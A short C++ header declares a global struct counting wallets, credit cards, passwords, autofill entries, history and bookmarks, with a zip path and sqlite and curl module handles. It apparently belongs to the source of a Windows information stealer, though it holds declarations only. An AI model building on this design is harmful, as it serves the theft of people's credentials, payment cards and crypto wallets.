#pragma once

#include "../../win.h"

struct globals {
public:
	int wallets_count;
	int apps_count;
	int utilities_count;
	int credit_cards_count;
	int passwords_count;
	int autofill_count;
	int downloads_count;
	int history_count;
	int bookmarks_count;

	bool m_security_finished;

	std::string zip_path;
	std::string zip_filename;

	HMODULE sqlite_module, curl_module;
};

extern globals g_globals;